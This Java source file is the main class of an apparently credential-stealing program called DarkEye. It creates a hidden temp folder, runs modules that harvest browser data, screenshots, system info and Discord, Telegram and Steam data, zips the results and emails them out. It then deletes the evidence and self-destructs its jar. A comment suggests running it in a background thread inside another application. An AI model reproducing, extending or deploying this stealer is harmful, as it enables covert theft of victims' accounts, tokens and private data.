package org.spray.darkeye;

import java.io.File;
import java.nio.file.Files;

import org.spray.darkeye.managers.BrowserManager;
import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.managers.InfoManager;
import org.spray.darkeye.managers.ScreenManager;
import org.spray.darkeye.module.AppsModule;
import org.spray.darkeye.module.DiscordModule;
import org.spray.darkeye.module.SteamModule;
import org.spray.darkeye.module.TelegramModule;
import org.spray.darkeye.providers.EMailProvider;
import org.spray.darkeye.utils.FileUtils;
import org.spray.darkeye.utils.Utils;

public class DarkEye {

	public static final String BUILD = "2b";

	private static InfoManager infoManager;
	private static CopyManager browserManager;
	private static ScreenManager screenManager;
	private static DiscordModule discordModule;
	private static TelegramModule telegramModule;
	private static SteamModule steamModule;
	private static AppsModule appsModule;

	private static EMailProvider provider;

	private static File tempFolder, archivedFiles;

	public static void main(String[] args) {
//		System.out.println("[DarkEye-Java " + BUILD + "]");

		// If the process is closed before the end of the work
		Runtime.getRuntime().addShutdownHook(new Thread(() -> {
			shutdown();
		}));

//      I advise you to use this when integrating into your application
//	    new Thread(() -> DarkEye.start()).start(); 

		start();
	}

	public static void start() {
		String randomName = Utils.randomString(8).toUpperCase();
		tempFolder = new File(System.getenv("TEMP"), randomName + ".tmp");

		if (!tempFolder.exists())
			tempFolder.mkdir();

		try {
			Files.setAttribute(tempFolder.toPath(), "dos:hidden", true);

			infoManager = new InfoManager(tempFolder.getAbsolutePath());
			browserManager = new BrowserManager(tempFolder.getAbsolutePath());
			screenManager = new ScreenManager(tempFolder.getAbsolutePath());
			discordModule = new DiscordModule(tempFolder.getAbsolutePath());
			telegramModule = new TelegramModule(tempFolder.getAbsolutePath());
			steamModule = new SteamModule(tempFolder.getAbsolutePath());
			appsModule = new AppsModule(tempFolder.getAbsolutePath());

			infoManager.run();
			browserManager.run();
			screenManager.run();
			discordModule.run();
			telegramModule.run();
			steamModule.run();
			appsModule.run();

			archivedFiles = new File(System.getenv("TEMP"), randomName + ".zip");

			FileUtils.pack(tempFolder.getAbsolutePath(), archivedFiles.getAbsolutePath());
			provider = new EMailProvider(archivedFiles);

			provider.run();
		} catch (Exception e) {
		}

		shutdown();
	}

	private static void shutdown() {
		try {
			if (tempFolder != null && tempFolder.exists())
				FileUtils.deleteDir(tempFolder);

			if (archivedFiles != null && archivedFiles.exists())
				FileUtils.deleteDir(archivedFiles);

			FileUtils.seldDestructionJar();
		} catch (Exception e) {
		}
	}
}